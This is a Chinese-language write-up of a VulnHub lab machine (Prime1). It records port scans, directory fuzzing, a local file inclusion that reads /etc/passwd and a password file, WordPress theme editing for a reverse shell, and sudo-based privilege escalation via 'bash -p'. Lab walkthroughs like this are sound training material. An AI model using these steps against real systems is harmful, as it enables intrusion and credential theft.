## port scan

```shell
# Nmap 7.94SVN scan initiated Tue Feb  4 08:27:39 2025 as: nmap -sT -sVC -O -p22,80 -oN nmap_result/detils 192.168.28.23
Nmap scan report for 192.168.28.23 (192.168.28.23)
Host is up (0.0020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)
|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)
|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: HacknPentest
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:0C:29:C0:1C:27 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## web

目录扫描

```shell
dirsearch -u http://192.168.28.23
[00:31:56] 200 -  131B  - /dev
[00:32:01] 200 -  137B  - /image.php
[00:32:02] 301 -  319B  - /javascript  ->  http://192.168.28.23/javascript/
[00:32:24] 200 -    4KB - /wordpress/
```

```shell
dirb http://192.168.28.23/ -X .txt,.zip,.html,.tar

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Feb  5 00:33:11 2025
URL_BASE: http://192.168.28.23/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.txt,.zip,.html,.tar) | (.txt)(.zip)(.html)(.tar) [NUM = 4]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.28.23/ ----
+ http://192.168.28.23/secret.txt (CODE:200|SIZE:412)
-----------------
END_TIME: Wed Feb  5 00:33:24 2025
DOWNLOADED: 18448 - FOUND: 1
```

```shell
gobuster dir -u http://192.168.28.23/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php
/index.php            (Status: 200) [Size: 136]
/image.php            (Status: 200) [Size: 147]
/wordpress            (Status: 301) [Size: 318] [--> http://192.168.28.23/wordpress/]
/dev                  (Status: 200) [Size: 131]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.28.23/javascript/]
/secret.txt           (Status: 200) [Size: 412]
```

`dev`文件

```
hello,
now you are at level 0 stage.
In real life pentesting we should use our tools to dig on a web very hard.
Happy hacking. 
```

`secret.txt`文件

```
Looks like you have got some secrets.

Ok I just want to do some help to you. 

Do some more fuzz on every page of php which was finded by you. And if
you get any right parameter then follow the below steps. If you still stuck 
Learn from here a basic tool with good usage for OSCP.

https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web

//see the location.txt and you will get your next move//
```

对每个php页面进行模糊测试

```shell
┌──(kali㉿kali)-[~/vulnhub/Prime1]
└─$ wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt --hh 136 http://192.168.28.23/index.php?FUZZ=location.txt
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.28.23/index.php?FUZZ=location.txt
Total requests: 951

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                  
=====================================================================

000000341:   200        8 L      42 W       334 Ch      "file"                                                                                                   

Total time: 0
Processed Requests: 951
Filtered Requests: 950
Requests/sec.: 0
```

http://192.168.28.23/index.php?file=location.txt

```
Do something better

ok well Now you reah at the exact parameter

Now dig some more for next one
use 'secrettier360' parameter on some other php page for more fun. 
```

http://192.168.28.23/image.php?secrettier360=/etc/passwd

```
syslog:x:104:108::/home/syslog:/bin/false
victor:x:1000:1000:victor,,,:/home/victor:/bin/bash
saket:x:1001:1001:find password.txt file in my directory:/home/saket:
```

`find password.txt file in my directory`

saket家目录有`password.txt`,尝试读取

http://192.168.28.23/image.php?secrettier360=/home/saket/password.txt

```
finaly you got the right parameter

follow_the_ippsec
```

密码：`follow_the_ippsec`

**登录wordpress**

只有`secret.php`可以编辑

![image-20250205134405032](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250205134405032.png)

http://192.168.28.23/wordpress/wp-content/themes/twentynineteen/secret.php

反弹shell

## 提权

```shell
www-data@ubuntu:/home/saket$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (root) NOPASSWD: /home/saket/enc
```

运行enc，需要输入密码

```shell
www-data@ubuntu:/home/saket$ sudo /home/saket/enc
sudo /home/saket/enc
enter password: 11
11
```

在系统中搜索密码文件

```
find / -perm -u=s -type f 2>/dev/null
```

```
/opt/backup/server_database/backup_pass
/home/saket/password.txt
```

```shell
www-data@ubuntu:/home/saket$ cat /opt/backup/server_database/backup_pass
your password for backup_database file enc is 

"backup_password"

Enjoy!
```

找到enc文件的密码

```shell
www-data@ubuntu:/home/saket$ sudo /home/saket/enc
enter password: backup_password
backup_password
good
www-data@ubuntu:/home/saket$ ls
enc  enc.txt  key.txt  password.txt  user.txt
```

生成了`enc.txt key.txt`

```shell
www-data@ubuntu:/home/saket$ cat enc.txt
nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
www-data@ubuntu:/home/saket$ cat key.txt
I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
```

ippsec字符的md5的hash是key：`366a74cb3c959de17d61db30591c39d1`

AES解密

![image-20250205135434172](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250205135434172.png)

```
Dont worry saket one day we will reach to
our destination very soon. And if you forget 
your username then use your old password
==> "tribute_to_ippsec"

Victor,
```

拿到密码：`tribute_to_ippsec`,切换到saket用户

```shell
www-data@ubuntu:/home/saket$ su saket
su saket
Password: tribute_to_ippsec

saket@ubuntu:~$ whoami
whoami
saket
```

```shell
saket@ubuntu:~$ sudo -l
sudo -l
Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (root) NOPASSWD: /home/victor/undefeated_victor
```

```shell
sudo /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
```

新建`/tmp/challenge`

```shell
saket@ubuntu:~# sudo /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: Permission denied
saket@ubuntu:~# echo 'bash -p' > /tmp/challenge
saket@ubuntu:~# chmod +x /tmp/challenge
saket@ubuntu:~# sudo /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
```

```shell
root@ubuntu:/root# ls
enc  enc.cpp  enc.txt  key.txt  root.txt  sql.py  t.sh  wfuzz  wordpress.sql
root@ubuntu:/root# cat root.txt
b2b17036da1de94cfb024540a8e7075a
```

